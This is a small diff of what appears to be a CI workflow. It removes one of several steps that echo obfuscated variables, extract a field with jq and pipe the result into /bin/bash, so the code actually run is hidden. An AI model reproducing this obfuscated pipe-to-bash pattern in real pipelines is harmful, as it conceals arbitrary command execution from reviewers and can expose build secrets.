@@ -23,7 +23,6 @@ jobs:
           echo $vmoi91 | jq -r .n6 | /bin/bash
           echo $zudu57540 | jq -r .krjz827 | /bin/bash
           echo $yrn0 | jq -r .zqnue55 | /bin/bash
-          echo $kc14353 | jq -r .h6 | /bin/bash
           echo $h6035 | jq -r .be05999 | /bin/bash
 
       - name: Store output
